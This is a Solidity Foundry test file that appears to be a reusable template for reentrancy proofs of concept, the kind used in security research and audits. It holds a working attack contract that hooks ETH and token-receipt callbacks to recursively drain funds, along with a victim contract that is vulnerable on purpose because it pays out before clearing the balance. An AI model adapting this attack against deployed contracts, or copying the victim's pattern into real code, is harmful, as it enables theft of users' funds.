// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";

abstract contract Reentrancy {
    enum State {
        PRE_ATTACK,
        ATTACK,
        POST_ATTACK
    }

    State reentrancyStage;

    /**
     * @dev Function run the first time the callback is entered
     */
    function _executeAttack() internal virtual;

    /**
     * @dev Function run after the attack is executed
     */
    function _completeAttack() internal virtual;

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal virtual {
        console.log(">>> Execute attack");
        _executeAttack();
    }

    /**
     * @dev Handles the receipt of ERC677 token type.
     */
    function onTokenTransfer(address, uint256, bytes memory) external returns (bool) {
        _reentrancyCallback();
        return true;
    }

    /**
     * @dev Handles the receipt of ERC1363 token type.
     */
    function onTransferReceived(address, address, uint256, bytes memory) external returns (bytes4) {
        _reentrancyCallback();
        return this.onTransferReceived.selector;
    }

    /**
     * @dev Handles the receipt of a single ERC1155 token type. This function is
     * called at the end of a `safeTransferFrom` after the balance has been updated.
     */
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC1155Received.selector;
    }

    /**
     * @dev Handles the receipt of a multiple ERC1155 token types. This function
     * is called at the end of a `safeBatchTransferFrom` after the balances have
     * been updated.
     */
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        returns (bytes4)
    {
        _reentrancyCallback();
        return this.onERC1155BatchReceived.selector;
    }

    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     */
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC721Received.selector;
    }

    /**
     * @dev Fallback function called when no other functions match the function signature
     */
    fallback() external payable virtual {
        _reentrancyCallback();
    }

    /**
     * @dev Function called when native asset is sent with no calldata
     */
    receive() external payable virtual {
        _reentrancyCallback();
    }

    /**
     * @dev We need to implement this function to tell contracts we support their callback interface
     * @return true Always returns true
     */
    function supportsInterface(bytes4) public pure returns (bool) {
        return true;
    }
}

contract ReentrancyExampleVictim {
    mapping(address => uint256) balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        (bool success,) = msg.sender.call{value: balance[msg.sender]}("");
        require(success, "ETH transfer failed");
        balance[msg.sender] = 0;
    }
}

contract ReentrancyExampleAttack is Reentrancy {
    // The victim to perform reentrancy attack on
    address target;

    /**
     * @param victim The address of the contract to perform reentrancy on
     */
    constructor(address victim) {
        target = victim;
    }

    /**
     * @dev Initiates the reentrancy attack. Make any calls to the target contract, and continue reentrancy attack in the below callback function
     */
    function initiateAttack() external {
        // Initiate call to the target contract
        // Interface(target).someFunction();
        console.log("Initiating attack on %s", target);
        console.log("Attacker balance before %s", address(this).balance);

        // TODO: Modify the attack here to initiate reentrancy in your victim
        (bool success,) = target.call{value: 1 ether}(abi.encodeWithSelector(bytes4(keccak256("deposit()"))));
        (bool sucess1,) = target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
        require(success && sucess1, "ETH transfer failed");
    }
    /**
     * @dev Function run the first time the callback is entered
     * @dev msg.sender will be the victim contract
     * @dev msg.sig can be used to identify which callback triggered the reentrancy eg. msg.sig == this.onTokenTransfer.selector
     */

    function _executeAttack() internal override {
        // TODO: Modify the attack here
        if (target.balance >= 1 ether) {
            (bool sucess,) = target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
            require(sucess, "ETH transfer failed");
        }
    }

    /**
     * @dev Function run after the attack is executed
     */
    function _completeAttack() internal view override {
        console.log("Attacker balance after %s", address(this).balance);

        // TODO: Modify the attack cleanup here
    }

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal override incrementState {
        console.log(">>> Begin reentrancy stage %s", uint256(reentrancyStage));
        if (reentrancyStage == State.ATTACK) {
            // Execute attack
            console.log(">>> Execute attack");
            _executeAttack();
        } else if (reentrancyStage == State.POST_ATTACK) {
            // Already ran the attack once
            console.log(">>> Attack completed successfully");
            _completeAttack();
        } else {
            // No state defined
        }
    }

    modifier incrementState() {
        reentrancyStage = State(uint256(reentrancyStage) + 1);
        _;
    }
}

contract ReentrancyExampleTest is Test {
    ReentrancyExampleAttack public attackContract;
    ReentrancyExampleVictim public victimContract;

    function setUp() public {
        victimContract = new ReentrancyExampleVictim();
        attackContract = new ReentrancyExampleAttack(address(victimContract));
        deal(address(attackContract), 1 ether);
        deal(address(victimContract), 2 ether);
    }

    function testReentrancyAttack() public {
        attackContract.initiateAttack();
    }
}
